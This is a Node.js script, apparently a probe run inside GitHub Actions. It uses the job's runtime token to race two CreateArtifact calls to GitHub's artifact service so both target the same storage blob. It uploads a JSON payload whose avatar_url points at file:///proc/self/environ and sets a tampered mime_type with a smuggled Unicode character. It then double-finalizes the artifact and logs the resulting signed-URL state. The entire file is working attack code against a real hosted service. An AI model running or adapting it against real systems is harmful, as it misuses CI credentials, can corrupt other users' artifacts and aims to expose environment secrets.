'use strict';

const crypto = require('node:crypto');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

function pause(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
    signal: AbortSignal.timeout(12000),
  });
  return { status: response.status, body: await response.json().catch(() => ({})) };
}

function blobKey(url) {
  if (!url) return null;
  const parsed = new URL(url);
  return parsed.hostname + parsed.pathname;
}

async function signedState(ctx, name, legacyUrl, rawUrl) {
  const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
  const url = signed.body.signed_url || signed.body.signedUrl;
  if (!url) return { status: signed.status, error: signed.body.msg || signed.body.message || '' };
  const response = await fetch(url, { signal: AbortSignal.timeout(12000) });
  const body = Buffer.from(await response.arrayBuffer());
  const key = blobKey(url);
  return {
    status: signed.status,
    target: key === blobKey(legacyUrl) ? 'legacy' : key === blobKey(rawUrl) ? 'raw' : 'other',
    rsctCodepoints: Array.from(new URL(url).searchParams.get('rsct') || '',
      (char) => char.codePointAt(0).toString(16)).join(','),
    get: response.status,
    contentTypeHex: Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex'),
    bodySha: crypto.createHash('sha256').update(body).digest('hex').slice(0, 16),
    bodyLength: body.length,
  };
}

(async () => {
  const ctx = context();
  const payload = Buffer.from('{"full_name":"collision/probe","owner":{"login":"p","avatar_url":"file:///proc/self/environ"}}');
  const payloadHash = `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}`;
  const modes = [
    ['simultaneous', 0, 0],
    ['legacy-first-2', 0, 2],
    ['raw-first-2', 2, 0],
    ['legacy-first-20', 0, 20],
    ['raw-first-20', 20, 0],
    ['simultaneous-2', 0, 0],
    ['simultaneous-3', 0, 0],
    ['simultaneous-4', 0, 0],
  ];
  for (let index = 0; index < modes.length; index += 1) {
    const [mode, legacyDelay, rawDelay] = modes[index];
    const name = `collision-${index}-${Date.now()}.json`;
    const legacyPromise = (async () => {
      if (legacyDelay) await pause(legacyDelay);
      return rpc(ctx, 'CreateArtifact', { name, version: 6,
        mime_type: '\u0185application/json' });
    })();
    const rawPromise = (async () => {
      if (rawDelay) await pause(rawDelay);
      return rpc(ctx, 'CreateArtifact', { name, version: 7,
        mime_type: 'application/json' });
    })();
    let legacy;
    let raw;
    try { [legacy, raw] = await Promise.all([legacyPromise, rawPromise]); }
    catch (error) {
      console.log('COLLISION ' + JSON.stringify({ mode, stage: 'create', error: `${error.name}:${error.message}` }));
      continue;
    }
    const legacyUrl = legacy.body.signed_upload_url || legacy.body.signedUploadUrl;
    const rawUrl = raw.body.signed_upload_url || raw.body.signedUploadUrl;
    const output = { mode, legacyCreate: legacy.status, rawCreate: raw.status,
      legacyUrl: Boolean(legacyUrl), rawUrl: Boolean(rawUrl),
      sameBlob: Boolean(legacyUrl && rawUrl && blobKey(legacyUrl) === blobKey(rawUrl)) };
    try {
      if (legacyUrl) output.legacyUpload = (await fetch(legacyUrl, { method: 'PUT',
        headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' },
        body: payload, signal: AbortSignal.timeout(12000) })).status;
      if (rawUrl) output.rawUpload = (await fetch(rawUrl, { method: 'PUT',
        headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' },
        body: payload, signal: AbortSignal.timeout(12000) })).status;
      output.before = await signedState(ctx, name, legacyUrl, rawUrl);
      const finalized = await rpc(ctx, 'FinalizeArtifact', {
        name, size: String(payload.length), hash: payloadHash,
      });
      output.finalize = finalized.status;
      output.artifactId = finalized.body.artifact_id || finalized.body.artifactId || null;
      output.after = await signedState(ctx, name, legacyUrl, rawUrl);
      const second = await rpc(ctx, 'FinalizeArtifact', {
        name, size: String(payload.length), hash: payloadHash,
      });
      output.secondFinalize = second.status;
      output.secondArtifactId = second.body.artifact_id || second.body.artifactId || null;
    } catch (error) {
      output.error = `${error.name}:${error.message}`;
    }
    console.log('COLLISION ' + JSON.stringify(output));
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
